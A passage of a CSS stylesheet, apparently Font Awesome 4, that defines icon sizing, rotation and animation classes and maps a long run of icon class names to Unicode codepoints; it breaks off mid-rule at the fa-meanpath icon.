        .fa-lg {
            font-size: 1.33333333em;
            line-height: 0.75em;
            vertical-align: -15%;
        }

        .fa-2x {
            font-size: 2em;
        }

        .fa-3x {
            font-size: 3em;
        }

        .fa-4x {
            font-size: 4em;
        }

        .fa-5x {
            font-size: 5em;
        }

        .fa-fw {
            width: 1.28571429em;
            text-align: center;
        }

        .fa-ul {
            padding-left: 0;
            margin-left: 2.14285714em;
            list-style-type: none;
        }

        .fa-ul>li {
            position: relative;
        }

        .fa-li {
            position: absolute;
            left: -2.14285714em;
            width: 2.14285714em;
            top: 0.14285714em;
            text-align: center;
        }

        .fa-li.fa-lg {
            left: -1.85714286em;
        }

        .fa-border {
            padding: 0.2em 0.25em 0.15em;
            border: solid 0.08em #eee;
            border-radius: 0.1em;
        }

        .fa-pull-left {
            float: left;
        }

        .fa-pull-right {
            float: right;
        }

        .fa.fa-pull-left {
            margin-right: 0.3em;
        }

        .fa.fa-pull-right {
            margin-left: 0.3em;
        }

        .pull-right {
            float: right;
        }

        .pull-left {
            float: left;
        }

        .fa.pull-left {
            margin-right: 0.3em;
        }

        .fa.pull-right {
            margin-left: 0.3em;
        }

        .fa-spin {
            -webkit-animation: fa-spin 2s infinite linear;
            animation: fa-spin 2s infinite linear;
        }

        .fa-pulse {
            -webkit-animation: fa-spin 1s infinite steps(8);
            animation: fa-spin 1s infinite steps(8);
        }

        @-webkit-keyframes fa-spin {
            0% {
                -webkit-transform: rotate(0deg);
                transform: rotate(0deg);
            }

            100% {
                -webkit-transform: rotate(359deg);
                transform: rotate(359deg);
            }
        }

        @keyframes fa-spin {
            0% {
                -webkit-transform: rotate(0deg);
                transform: rotate(0deg);
            }

            100% {
                -webkit-transform: rotate(359deg);
                transform: rotate(359deg);
            }
        }

        .fa-rotate-90 {
            -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=1)";
            -webkit-transform: rotate(90deg);
            -ms-transform: rotate(90deg);
            transform: rotate(90deg);
        }

        .fa-rotate-180 {
            -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2)";
            -webkit-transform: rotate(180deg);
            -ms-transform: rotate(180deg);
            transform: rotate(180deg);
        }

        .fa-rotate-270 {
            -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=3)";
            -webkit-transform: rotate(270deg);
            -ms-transform: rotate(270deg);
            transform: rotate(270deg);
        }

        .fa-flip-horizontal {
            -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=0, mirror=1)";
            -webkit-transform: scale(-1, 1);
            -ms-transform: scale(-1, 1);
            transform: scale(-1, 1);
        }

        .fa-flip-vertical {
            -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";
            -webkit-transform: scale(1, -1);
            -ms-transform: scale(1, -1);
            transform: scale(1, -1);
        }

        :root .fa-rotate-90,
        :root .fa-rotate-180,
        :root .fa-rotate-270,
        :root .fa-flip-horizontal,
        :root .fa-flip-vertical {
            filter: none;
        }

        .fa-stack {
            position: relative;
            display: inline-block;
            width: 2em;
            height: 2em;
            line-height: 2em;
            vertical-align: middle;
        }

        .fa-stack-1x,
        .fa-stack-2x {
            position: absolute;
            left: 0;
            width: 100%;
            text-align: center;
        }

        .fa-stack-1x {
            line-height: inherit;
        }

        .fa-stack-2x {
            font-size: 2em;
        }

        .fa-inverse {
            color: #fff;
        }

        .fa-glass:before {
            content: "\f000";
        }

        .fa-music:before {
            content: "\f001";
        }

        .fa-search:before {
            content: "\f002";
        }

        .fa-envelope-o:before {
            content: "\f003";
        }

        .fa-heart:before {
            content: "\f004";
        }

        .fa-star:before {
            content: "\f005";
        }

        .fa-star-o:before {
            content: "\f006";
        }

        .fa-user:before {
            content: "\f007";
        }

        .fa-film:before {
            content: "\f008";
        }

        .fa-th-large:before {
            content: "\f009";
        }

        .fa-th:before {
            content: "\f00a";
        }

        .fa-th-list:before {
            content: "\f00b";
        }

        .fa-check:before {
            content: "\f00c";
        }

        .fa-remove:before,
        .fa-close:before,
        .fa-times:before {
            content: "\f00d";
        }

        .fa-search-plus:before {
            content: "\f00e";
        }

        .fa-search-minus:before {
            content: "\f010";
        }

        .fa-power-off:before {
            content: "\f011";
        }

        .fa-signal:before {
            content: "\f012";
        }

        .fa-gear:before,
        .fa-cog:before {
            content: "\f013";
        }

        .fa-trash-o:before {
            content: "\f014";
        }

        .fa-home:before {
            content: "\f015";
        }

        .fa-file-o:before {
            content: "\f016";
        }

        .fa-clock-o:before {
            content: "\f017";
        }

        .fa-road:before {
            content: "\f018";
        }

        .fa-download:before {
            content: "\f019";
        }

        .fa-arrow-circle-o-down:before {
            content: "\f01a";
        }

        .fa-arrow-circle-o-up:before {
            content: "\f01b";
        }

        .fa-inbox:before {
            content: "\f01c";
        }

        .fa-play-circle-o:before {
            content: "\f01d";
        }

        .fa-rotate-right:before,
        .fa-repeat:before {
            content: "\f01e";
        }

        .fa-refresh:before {
            content: "\f021";
        }

        .fa-list-alt:before {
            content: "\f022";
        }

        .fa-lock:before {
            content: "\f023";
        }

        .fa-flag:before {
            content: "\f024";
        }

        .fa-headphones:before {
            content: "\f025";
        }

        .fa-volume-off:before {
            content: "\f026";
        }

        .fa-volume-down:before {
            content: "\f027";
        }

        .fa-volume-up:before {
            content: "\f028";
        }

        .fa-qrcode:before {
            content: "\f029";
        }

        .fa-barcode:before {
            content: "\f02a";
        }

        .fa-tag:before {
            content: "\f02b";
        }

        .fa-tags:before {
            content: "\f02c";
        }

        .fa-book:before {
            content: "\f02d";
        }

        .fa-bookmark:before {
            content: "\f02e";
        }

        .fa-print:before {
            content: "\f02f";
        }

        .fa-camera:before {
            content: "\f030";
        }

        .fa-font:before {
            content: "\f031";
        }

        .fa-bold:before {
            content: "\f032";
        }

        .fa-italic:before {
            content: "\f033";
        }

        .fa-text-height:before {
            content: "\f034";
        }

        .fa-text-width:before {
            content: "\f035";
        }

        .fa-align-left:before {
            content: "\f036";
        }

        .fa-align-center:before {
            content: "\f037";
        }

        .fa-align-right:before {
            content: "\f038";
        }

        .fa-align-justify:before {
            content: "\f039";
        }

        .fa-list:before {
            content: "\f03a";
        }

        .fa-dedent:before,
        .fa-outdent:before {
            content: "\f03b";
        }

        .fa-indent:before {
            content: "\f03c";
        }

        .fa-video-camera:before {
            content: "\f03d";
        }

        .fa-photo:before,
        .fa-image:before,
        .fa-picture-o:before {
            content: "\f03e";
        }

        .fa-pencil:before {
            content: "\f040";
        }

        .fa-map-marker:before {
            content: "\f041";
        }

        .fa-adjust:before {
            content: "\f042";
        }

        .fa-tint:before {
            content: "\f043";
        }

        .fa-edit:before,
        .fa-pencil-square-o:before {
            content: "\f044";
        }

        .fa-share-square-o:before {
            content: "\f045";
        }

        .fa-check-square-o:before {
            content: "\f046";
        }

        .fa-arrows:before {
            content: "\f047";
        }

        .fa-step-backward:before {
            content: "\f048";
        }

        .fa-fast-backward:before {
            content: "\f049";
        }

        .fa-backward:before {
            content: "\f04a";
        }

        .fa-play:before {
            content: "\f04b";
        }

        .fa-pause:before {
            content: "\f04c";
        }

        .fa-stop:before {
            content: "\f04d";
        }

        .fa-forward:before {
            content: "\f04e";
        }

        .fa-fast-forward:before {
            content: "\f050";
        }

        .fa-step-forward:before {
            content: "\f051";
        }

        .fa-eject:before {
            content: "\f052";
        }

        .fa-chevron-left:before {
            content: "\f053";
        }

        .fa-chevron-right:before {
            content: "\f054";
        }

        .fa-plus-circle:before {
            content: "\f055";
        }

        .fa-minus-circle:before {
            content: "\f056";
        }

        .fa-times-circle:before {
            content: "\f057";
        }

        .fa-check-circle:before {
            content: "\f058";
        }

        .fa-question-circle:before {
            content: "\f059";
        }

        .fa-info-circle:before {
            content: "\f05a";
        }

        .fa-crosshairs:before {
            content: "\f05b";
        }

        .fa-times-circle-o:before {
            content: "\f05c";
        }

        .fa-check-circle-o:before {
            content: "\f05d";
        }

        .fa-ban:before {
            content: "\f05e";
        }

        .fa-arrow-left:before {
            content: "\f060";
        }

        .fa-arrow-right:before {
            content: "\f061";
        }

        .fa-arrow-up:before {
            content: "\f062";
        }

        .fa-arrow-down:before {
            content: "\f063";
        }

        .fa-mail-forward:before,
        .fa-share:before {
            content: "\f064";
        }

        .fa-expand:before {
            content: "\f065";
        }

        .fa-compress:before {
            content: "\f066";
        }

        .fa-plus:before {
            content: "\f067";
        }

        .fa-minus:before {
            content: "\f068";
        }

        .fa-asterisk:before {
            content: "\f069";
        }

        .fa-exclamation-circle:before {
            content: "\f06a";
        }

        .fa-gift:before {
            content: "\f06b";
        }

        .fa-leaf:before {
            content: "\f06c";
        }

        .fa-fire:before {
            content: "\f06d";
        }

        .fa-eye:before {
            content: "\f06e";
        }

        .fa-eye-slash:before {
            content: "\f070";
        }

        .fa-warning:before,
        .fa-exclamation-triangle:before {
            content: "\f071";
        }

        .fa-plane:before {
            content: "\f072";
        }

        .fa-calendar:before {
            content: "\f073";
        }

        .fa-random:before {
            content: "\f074";
        }

        .fa-comment:before {
            content: "\f075";
        }

        .fa-magnet:before {
            content: "\f076";
        }

        .fa-chevron-up:before {
            content: "\f077";
        }

        .fa-chevron-down:before {
            content: "\f078";
        }

        .fa-retweet:before {
            content: "\f079";
        }

        .fa-shopping-cart:before {
            content: "\f07a";
        }

        .fa-folder:before {
            content: "\f07b";
        }

        .fa-folder-open:before {
            content: "\f07c";
        }

        .fa-arrows-v:before {
            content: "\f07d";
        }

        .fa-arrows-h:before {
            content: "\f07e";
        }

        .fa-bar-chart-o:before,
        .fa-bar-chart:before {
            content: "\f080";
        }

        .fa-twitter-square:before {
            content: "\f081";
        }

        .fa-facebook-square:before {
            content: "\f082";
        }

        .fa-camera-retro:before {
            content: "\f083";
        }

        .fa-key:before {
            content: "\f084";
        }

        .fa-gears:before,
        .fa-cogs:before {
            content: "\f085";
        }

        .fa-comments:before {
            content: "\f086";
        }

        .fa-thumbs-o-up:before {
            content: "\f087";
        }

        .fa-thumbs-o-down:before {
            content: "\f088";
        }

        .fa-star-half:before {
            content: "\f089";
        }

        .fa-heart-o:before {
            content: "\f08a";
        }

        .fa-sign-out:before {
            content: "\f08b";
        }

        .fa-linkedin-square:before {
            content: "\f08c";
        }

        .fa-thumb-tack:before {
            content: "\f08d";
        }

        .fa-external-link:before {
            content: "\f08e";
        }

        .fa-sign-in:before {
            content: "\f090";
        }

        .fa-trophy:before {
            content: "\f091";
        }

        .fa-github-square:before {
            content: "\f092";
        }

        .fa-upload:before {
            content: "\f093";
        }

        .fa-lemon-o:before {
            content: "\f094";
        }

        .fa-phone:before {
            content: "\f095";
        }

        .fa-square-o:before {
            content: "\f096";
        }

        .fa-bookmark-o:before {
            content: "\f097";
        }

        .fa-phone-square:before {
            content: "\f098";
        }

        .fa-twitter:before {
            content: "\f099";
        }

        .fa-facebook-f:before,
        .fa-facebook:before {
            content: "\f09a";
        }

        .fa-github:before {
            content: "\f09b";
        }

        .fa-unlock:before {
            content: "\f09c";
        }

        .fa-credit-card:before {
            content: "\f09d";
        }

        .fa-feed:before,
        .fa-rss:before {
            content: "\f09e";
        }

        .fa-hdd-o:before {
            content: "\f0a0";
        }

        .fa-bullhorn:before {
            content: "\f0a1";
        }

        .fa-bell:before {
            content: "\f0f3";
        }

        .fa-certificate:before {
            content: "\f0a3";
        }

        .fa-hand-o-right:before {
            content: "\f0a4";
        }

        .fa-hand-o-left:before {
            content: "\f0a5";
        }

        .fa-hand-o-up:before {
            content: "\f0a6";
        }

        .fa-hand-o-down:before {
            content: "\f0a7";
        }

        .fa-arrow-circle-left:before {
            content: "\f0a8";
        }

        .fa-arrow-circle-right:before {
            content: "\f0a9";
        }

        .fa-arrow-circle-up:before {
            content: "\f0aa";
        }

        .fa-arrow-circle-down:before {
            content: "\f0ab";
        }

        .fa-globe:before {
            content: "\f0ac";
        }

        .fa-wrench:before {
            content: "\f0ad";
        }

        .fa-tasks:before {
            content: "\f0ae";
        }

        .fa-filter:before {
            content: "\f0b0";
        }

        .fa-briefcase:before {
            content: "\f0b1";
        }

        .fa-arrows-alt:before {
            content: "\f0b2";
        }

        .fa-group:before,
        .fa-users:before {
            content: "\f0c0";
        }

        .fa-chain:before,
        .fa-link:before {
            content: "\f0c1";
        }

        .fa-cloud:before {
            content: "\f0c2";
        }

        .fa-flask:before {
            content: "\f0c3";
        }

        .fa-cut:before,
        .fa-scissors:before {
            content: "\f0c4";
        }

        .fa-copy:before,
        .fa-files-o:before {
            content: "\f0c5";
        }

        .fa-paperclip:before {
            content: "\f0c6";
        }

        .fa-save:before,
        .fa-floppy-o:before {
            content: "\f0c7";
        }

        .fa-square:before {
            content: "\f0c8";
        }

        .fa-navicon:before,
        .fa-reorder:before,
        .fa-bars:before {
            content: "\f0c9";
        }

        .fa-list-ul:before {
            content: "\f0ca";
        }

        .fa-list-ol:before {
            content: "\f0cb";
        }

        .fa-strikethrough:before {
            content: "\f0cc";
        }

        .fa-underline:before {
            content: "\f0cd";
        }

        .fa-table:before {
            content: "\f0ce";
        }

        .fa-magic:before {
            content: "\f0d0";
        }

        .fa-truck:before {
            content: "\f0d1";
        }

        .fa-pinterest:before {
            content: "\f0d2";
        }

        .fa-pinterest-square:before {
            content: "\f0d3";
        }

        .fa-google-plus-square:before {
            content: "\f0d4";
        }

        .fa-google-plus:before {
            content: "\f0d5";
        }

        .fa-money:before {
            content: "\f0d6";
        }

        .fa-caret-down:before {
            content: "\f0d7";
        }

        .fa-caret-up:before {
            content: "\f0d8";
        }

        .fa-caret-left:before {
            content: "\f0d9";
        }

        .fa-caret-right:before {
            content: "\f0da";
        }

        .fa-columns:before {
            content: "\f0db";
        }

        .fa-unsorted:before,
        .fa-sort:before {
            content: "\f0dc";
        }

        .fa-sort-down:before,
        .fa-sort-desc:before {
            content: "\f0dd";
        }

        .fa-sort-up:before,
        .fa-sort-asc:before {
            content: "\f0de";
        }

        .fa-envelope:before {
            content: "\f0e0";
        }

        .fa-linkedin:before {
            content: "\f0e1";
        }

        .fa-rotate-left:before,
        .fa-undo:before {
            content: "\f0e2";
        }

        .fa-legal:before,
        .fa-gavel:before {
            content: "\f0e3";
        }

        .fa-dashboard:before,
        .fa-tachometer:before {
            content: "\f0e4";
        }

        .fa-comment-o:before {
            content: "\f0e5";
        }

        .fa-comments-o:before {
            content: "\f0e6";
        }

        .fa-flash:before,
        .fa-bolt:before {
            content: "\f0e7";
        }

        .fa-sitemap:before {
            content: "\f0e8";
        }

        .fa-umbrella:before {
            content: "\f0e9";
        }

        .fa-paste:before,
        .fa-clipboard:before {
            content: "\f0ea";
        }

        .fa-lightbulb-o:before {
            content: "\f0eb";
        }

        .fa-exchange:before {
            content: "\f0ec";
        }

        .fa-cloud-download:before {
            content: "\f0ed";
        }

        .fa-cloud-upload:before {
            content: "\f0ee";
        }

        .fa-user-md:before {
            content: "\f0f0";
        }

        .fa-stethoscope:before {
            content: "\f0f1";
        }

        .fa-suitcase:before {
            content: "\f0f2";
        }

        .fa-bell-o:before {
            content: "\f0a2";
        }

        .fa-coffee:before {
            content: "\f0f4";
        }

        .fa-cutlery:before {
            content: "\f0f5";
        }

        .fa-file-text-o:before {
            content: "\f0f6";
        }

        .fa-building-o:before {
            content: "\f0f7";
        }

        .fa-hospital-o:before {
            content: "\f0f8";
        }

        .fa-ambulance:before {
            content: "\f0f9";
        }

        .fa-medkit:before {
            content: "\f0fa";
        }

        .fa-fighter-jet:before {
            content: "\f0fb";
        }

        .fa-beer:before {
            content: "\f0fc";
        }

        .fa-h-square:before {
            content: "\f0fd";
        }

        .fa-plus-square:before {
            content: "\f0fe";
        }

        .fa-angle-double-left:before {
            content: "\f100";
        }

        .fa-angle-double-right:before {
            content: "\f101";
        }

        .fa-angle-double-up:before {
            content: "\f102";
        }

        .fa-angle-double-down:before {
            content: "\f103";
        }

        .fa-angle-left:before {
            content: "\f104";
        }

        .fa-angle-right:before {
            content: "\f105";
        }

        .fa-angle-up:before {
            content: "\f106";
        }

        .fa-angle-down:before {
            content: "\f107";
        }

        .fa-desktop:before {
            content: "\f108";
        }

        .fa-laptop:before {
            content: "\f109";
        }

        .fa-tablet:before {
            content: "\f10a";
        }

        .fa-mobile-phone:before,
        .fa-mobile:before {
            content: "\f10b";
        }

        .fa-circle-o:before {
            content: "\f10c";
        }

        .fa-quote-left:before {
            content: "\f10d";
        }

        .fa-quote-right:before {
            content: "\f10e";
        }

        .fa-spinner:before {
            content: "\f110";
        }

        .fa-circle:before {
            content: "\f111";
        }

        .fa-mail-reply:before,
        .fa-reply:before {
            content: "\f112";
        }

        .fa-github-alt:before {
            content: "\f113";
        }

        .fa-folder-o:before {
            content: "\f114";
        }

        .fa-folder-open-o:before {
            content: "\f115";
        }

        .fa-smile-o:before {
            content: "\f118";
        }

        .fa-frown-o:before {
            content: "\f119";
        }

        .fa-meh-o:before {
            content: "\f11a";
        }

        .fa-gamepad:before {
            content: "\f11b";
        }

        .fa-keyboard-o:before {
            content: "\f11c";
        }

        .fa-flag-o:before {
            content: "\f11d";
        }

        .fa-flag-checkered:before {
            content: "\f11e";
        }

        .fa-terminal:before {
            content: "\f120";
        }

        .fa-code:before {
            content: "\f121";
        }

        .fa-mail-reply-all:before,
        .fa-reply-all:before {
            content: "\f122";
        }

        .fa-star-half-empty:before,
        .fa-star-half-full:before,
        .fa-star-half-o:before {
            content: "\f123";
        }

        .fa-location-arrow:before {
            content: "\f124";
        }

        .fa-crop:before {
            content: "\f125";
        }

        .fa-code-fork:before {
            content: "\f126";
        }

        .fa-unlink:before,
        .fa-chain-broken:before {
            content: "\f127";
        }

        .fa-question:before {
            content: "\f128";
        }

        .fa-info:before {
            content: "\f129";
        }

        .fa-exclamation:before {
            content: "\f12a";
        }

        .fa-superscript:before {
            content: "\f12b";
        }

        .fa-subscript:before {
            content: "\f12c";
        }

        .fa-eraser:before {
            content: "\f12d";
        }

        .fa-puzzle-piece:before {
            content: "\f12e";
        }

        .fa-microphone:before {
            content: "\f130";
        }

        .fa-microphone-slash:before {
            content: "\f131";
        }

        .fa-shield:before {
            content: "\f132";
        }

        .fa-calendar-o:before {
            content: "\f133";
        }

        .fa-fire-extinguisher:before {
            content: "\f134";
        }

        .fa-rocket:before {
            content: "\f135";
        }

        .fa-maxcdn:before {
            content: "\f136";
        }

        .fa-chevron-circle-left:before {
            content: "\f137";
        }

        .fa-chevron-circle-right:before {
            content: "\f138";
        }

        .fa-chevron-circle-up:before {
            content: "\f139";
        }

        .fa-chevron-circle-down:before {
            content: "\f13a";
        }

        .fa-html5:before {
            content: "\f13b";
        }

        .fa-css3:before {
            content: "\f13c";
        }

        .fa-anchor:before {
            content: "\f13d";
        }

        .fa-unlock-alt:before {
            content: "\f13e";
        }

        .fa-bullseye:before {
            content: "\f140";
        }

        .fa-ellipsis-h:before {
            content: "\f141";
        }

        .fa-ellipsis-v:before {
            content: "\f142";
        }

        .fa-rss-square:before {
            content: "\f143";
        }

        .fa-play-circle:before {
            content: "\f144";
        }

        .fa-ticket:before {
            content: "\f145";
        }

        .fa-minus-square:before {
            content: "\f146";
        }

        .fa-minus-square-o:before {
            content: "\f147";
        }

        .fa-level-up:before {
            content: "\f148";
        }

        .fa-level-down:before {
            content: "\f149";
        }

        .fa-check-square:before {
            content: "\f14a";
        }

        .fa-pencil-square:before {
            content: "\f14b";
        }

        .fa-external-link-square:before {
            content: "\f14c";
        }

        .fa-share-square:before {
            content: "\f14d";
        }

        .fa-compass:before {
            content: "\f14e";
        }

        .fa-toggle-down:before,
        .fa-caret-square-o-down:before {
            content: "\f150";
        }

        .fa-toggle-up:before,
        .fa-caret-square-o-up:before {
            content: "\f151";
        }

        .fa-toggle-right:before,
        .fa-caret-square-o-right:before {
            content: "\f152";
        }

        .fa-euro:before,
        .fa-eur:before {
            content: "\f153";
        }

        .fa-gbp:before {
            content: "\f154";
        }

        .fa-dollar:before,
        .fa-usd:before {
            content: "\f155";
        }

        .fa-rupee:before,
        .fa-inr:before {
            content: "\f156";
        }

        .fa-cny:before,
        .fa-rmb:before,
        .fa-yen:before,
        .fa-jpy:before {
            content: "\f157";
        }

        .fa-ruble:before,
        .fa-rouble:before,
        .fa-rub:before {
            content: "\f158";
        }

        .fa-won:before,
        .fa-krw:before {
            content: "\f159";
        }

        .fa-bitcoin:before,
        .fa-btc:before {
            content: "\f15a";
        }

        .fa-file:before {
            content: "\f15b";
        }

        .fa-file-text:before {
            content: "\f15c";
        }

        .fa-sort-alpha-asc:before {
            content: "\f15d";
        }

        .fa-sort-alpha-desc:before {
            content: "\f15e";
        }

        .fa-sort-amount-asc:before {
            content: "\f160";
        }

        .fa-sort-amount-desc:before {
            content: "\f161";
        }

        .fa-sort-numeric-asc:before {
            content: "\f162";
        }

        .fa-sort-numeric-desc:before {
            content: "\f163";
        }

        .fa-thumbs-up:before {
            content: "\f164";
        }

        .fa-thumbs-down:before {
            content: "\f165";
        }

        .fa-youtube-square:before {
            content: "\f166";
        }

        .fa-youtube:before {
            content: "\f167";
        }

        .fa-xing:before {
            content: "\f168";
        }

        .fa-xing-square:before {
            content: "\f169";
        }

        .fa-youtube-play:before {
            content: "\f16a";
        }

        .fa-dropbox:before {
            content: "\f16b";
        }

        .fa-stack-overflow:before {
            content: "\f16c";
        }

        .fa-instagram:before {
            content: "\f16d";
        }

        .fa-flickr:before {
            content: "\f16e";
        }

        .fa-adn:before {
            content: "\f170";
        }

        .fa-bitbucket:before {
            content: "\f171";
        }

        .fa-bitbucket-square:before {
            content: "\f172";
        }

        .fa-tumblr:before {
            content: "\f173";
        }

        .fa-tumblr-square:before {
            content: "\f174";
        }

        .fa-long-arrow-down:before {
            content: "\f175";
        }

        .fa-long-arrow-up:before {
            content: "\f176";
        }

        .fa-long-arrow-left:before {
            content: "\f177";
        }

        .fa-long-arrow-right:before {
            content: "\f178";
        }

        .fa-apple:before {
            content: "\f179";
        }

        .fa-windows:before {
            content: "\f17a";
        }

        .fa-android:before {
            content: "\f17b";
        }

        .fa-linux:before {
            content: "\f17c";
        }

        .fa-dribbble:before {
            content: "\f17d";
        }

        .fa-skype:before {
            content: "\f17e";
        }

        .fa-foursquare:before {
            content: "\f180";
        }

        .fa-trello:before {
            content: "\f181";
        }

        .fa-female:before {
            content: "\f182";
        }

        .fa-male:before {
            content: "\f183";
        }

        .fa-gittip:before,
        .fa-gratipay:before {
            content: "\f184";
        }

        .fa-sun-o:before {
            content: "\f185";
        }

        .fa-moon-o:before {
            content: "\f186";
        }

        .fa-archive:before {
            content: "\f187";
        }

        .fa-bug:before {
            content: "\f188";
        }

        .fa-vk:before {
            content: "\f189";
        }

        .fa-weibo:before {
            content: "\f18a";
        }

        .fa-renren:before {
            content: "\f18b";
        }

        .fa-pagelines:before {
            content: "\f18c";
        }

        .fa-stack-exchange:before {
            content: "\f18d";
        }

        .fa-arrow-circle-o-right:before {
            content: "\f18e";
        }

        .fa-arrow-circle-o-left:before {
            content: "\f190";
        }

        .fa-toggle-left:before,
        .fa-caret-square-o-left:before {
            content: "\f191";
        }

        .fa-dot-circle-o:before {
            content: "\f192";
        }

        .fa-wheelchair:before {
            content: "\f193";
        }

        .fa-vimeo-square:before {
            content: "\f194";
        }

        .fa-turkish-lira:before,
        .fa-try:before {
            content: "\f195";
        }

        .fa-plus-square-o:before {
            content: "\f196";
        }

        .fa-space-shuttle:before {
            content: "\f197";
        }

        .fa-slack:before {
            content: "\f198";
        }

        .fa-envelope-square:before {
            content: "\f199";
        }

        .fa-wordpress:before {
            content: "\f19a";
        }

        .fa-openid:before {
            content: "\f19b";
        }

        .fa-institution:before,
        .fa-bank:before,
        .fa-university:before {
            content: "\f19c";
        }

        .fa-mortar-board:before,
        .fa-graduation-cap:before {
            content: "\f19d";
        }

        .fa-yahoo:before {
            content: "\f19e";
        }

        .fa-google:before {
            content: "\f1a0";
        }

        .fa-reddit:before {
            content: "\f1a1";
        }

        .fa-reddit-square:before {
            content: "\f1a2";
        }

        .fa-stumbleupon-circle:before {
            content: "\f1a3";
        }

        .fa-stumbleupon:before {
            content: "\f1a4";
        }

        .fa-delicious:before {
            content: "\f1a5";
        }

        .fa-digg:before {
            content: "\f1a6";
        }

        .fa-pied-piper-pp:before {
            content: "\f1a7";
        }

        .fa-pied-piper-alt:before {
            content: "\f1a8";
        }

        .fa-drupal:before {
            content: "\f1a9";
        }

        .fa-joomla:before {
            content: "\f1aa";
        }

        .fa-language:before {
            content: "\f1ab";
        }

        .fa-fax:before {
            content: "\f1ac";
        }

        .fa-building:before {
            content: "\f1ad";
        }

        .fa-child:before {
            content: "\f1ae";
        }

        .fa-paw:before {
            content: "\f1b0";
        }

        .fa-spoon:before {
            content: "\f1b1";
        }

        .fa-cube:before {
            content: "\f1b2";
        }

        .fa-cubes:before {
            content: "\f1b3";
        }

        .fa-behance:before {
            content: "\f1b4";
        }

        .fa-behance-square:before {
            content: "\f1b5";
        }

        .fa-steam:before {
            content: "\f1b6";
        }

        .fa-steam-square:before {
            content: "\f1b7";
        }

        .fa-recycle:before {
            content: "\f1b8";
        }

        .fa-automobile:before,
        .fa-car:before {
            content: "\f1b9";
        }

        .fa-cab:before,
        .fa-taxi:before {
            content: "\f1ba";
        }

        .fa-tree:before {
            content: "\f1bb";
        }

        .fa-spotify:before {
            content: "\f1bc";
        }

        .fa-deviantart:before {
            content: "\f1bd";
        }

        .fa-soundcloud:before {
            content: "\f1be";
        }

        .fa-database:before {
            content: "\f1c0";
        }

        .fa-file-pdf-o:before {
            content: "\f1c1";
        }

        .fa-file-word-o:before {
            content: "\f1c2";
        }

        .fa-file-excel-o:before {
            content: "\f1c3";
        }

        .fa-file-powerpoint-o:before {
            content: "\f1c4";
        }

        .fa-file-photo-o:before,
        .fa-file-picture-o:before,
        .fa-file-image-o:before {
            content: "\f1c5";
        }

        .fa-file-zip-o:before,
        .fa-file-archive-o:before {
            content: "\f1c6";
        }

        .fa-file-sound-o:before,
        .fa-file-audio-o:before {
            content: "\f1c7";
        }

        .fa-file-movie-o:before,
        .fa-file-video-o:before {
            content: "\f1c8";
        }

        .fa-file-code-o:before {
            content: "\f1c9";
        }

        .fa-vine:before {
            content: "\f1ca";
        }

        .fa-codepen:before {
            content: "\f1cb";
        }

        .fa-jsfiddle:before {
            content: "\f1cc";
        }

        .fa-life-bouy:before,
        .fa-life-buoy:before,
        .fa-life-saver:before,
        .fa-support:before,
        .fa-life-ring:before {
            content: "\f1cd";
        }

        .fa-circle-o-notch:before {
            content: "\f1ce";
        }

        .fa-ra:before,
        .fa-resistance:before,
        .fa-rebel:before {
            content: "\f1d0";
        }

        .fa-ge:before,
        .fa-empire:before {
            content: "\f1d1";
        }

        .fa-git-square:before {
            content: "\f1d2";
        }

        .fa-git:before {
            content: "\f1d3";
        }

        .fa-y-combinator-square:before,
        .fa-yc-square:before,
        .fa-hacker-news:before {
            content: "\f1d4";
        }

        .fa-tencent-weibo:before {
            content: "\f1d5";
        }

        .fa-qq:before {
            content: "\f1d6";
        }

        .fa-wechat:before,
        .fa-weixin:before {
            content: "\f1d7";
        }

        .fa-send:before,
        .fa-paper-plane:before {
            content: "\f1d8";
        }

        .fa-send-o:before,
        .fa-paper-plane-o:before {
            content: "\f1d9";
        }

        .fa-history:before {
            content: "\f1da";
        }

        .fa-circle-thin:before {
            content: "\f1db";
        }

        .fa-header:before {
            content: "\f1dc";
        }

        .fa-paragraph:before {
            content: "\f1dd";
        }

        .fa-sliders:before {
            content: "\f1de";
        }

        .fa-share-alt:before {
            content: "\f1e0";
        }

        .fa-share-alt-square:before {
            content: "\f1e1";
        }

        .fa-bomb:before {
            content: "\f1e2";
        }

        .fa-soccer-ball-o:before,
        .fa-futbol-o:before {
            content: "\f1e3";
        }

        .fa-tty:before {
            content: "\f1e4";
        }

        .fa-binoculars:before {
            content: "\f1e5";
        }

        .fa-plug:before {
            content: "\f1e6";
        }

        .fa-slideshare:before {
            content: "\f1e7";
        }

        .fa-twitch:before {
            content: "\f1e8";
        }

        .fa-yelp:before {
            content: "\f1e9";
        }

        .fa-newspaper-o:before {
            content: "\f1ea";
        }

        .fa-wifi:before {
            content: "\f1eb";
        }

        .fa-calculator:before {
            content: "\f1ec";
        }

        .fa-paypal:before {
            content: "\f1ed";
        }

        .fa-google-wallet:before {
            content: "\f1ee";
        }

        .fa-cc-visa:before {
            content: "\f1f0";
        }

        .fa-cc-mastercard:before {
            content: "\f1f1";
        }

        .fa-cc-discover:before {
            content: "\f1f2";
        }

        .fa-cc-amex:before {
            content: "\f1f3";
        }

        .fa-cc-paypal:before {
            content: "\f1f4";
        }

        .fa-cc-stripe:before {
            content: "\f1f5";
        }

        .fa-bell-slash:before {
            content: "\f1f6";
        }

        .fa-bell-slash-o:before {
            content: "\f1f7";
        }

        .fa-trash:before {
            content: "\f1f8";
        }

        .fa-copyright:before {
            content: "\f1f9";
        }

        .fa-at:before {
            content: "\f1fa";
        }

        .fa-eyedropper:before {
            content: "\f1fb";
        }

        .fa-paint-brush:before {
            content: "\f1fc";
        }

        .fa-birthday-cake:before {
            content: "\f1fd";
        }

        .fa-area-chart:before {
            content: "\f1fe";
        }

        .fa-pie-chart:before {
            content: "\f200";
        }

        .fa-line-chart:before {
            content: "\f201";
        }

        .fa-lastfm:before {
            content: "\f202";
        }

        .fa-lastfm-square:before {
            content: "\f203";
        }

        .fa-toggle-off:before {
            content: "\f204";
        }

        .fa-toggle-on:before {
            content: "\f205";
        }

        .fa-bicycle:before {
            content: "\f206";
        }

        .fa-bus:before {
            content: "\f207";
        }

        .fa-ioxhost:before {
            content: "\f208";
        }

        .fa-angellist:before {
            content: "\f209";
        }

        .fa-cc:before {
            content: "\f20a";
        }

        .fa-shekel:before,
        .fa-sheqel:before,
        .fa-ils:before {
            content: "\f20b";
        }

        .fa-meanpath:before {
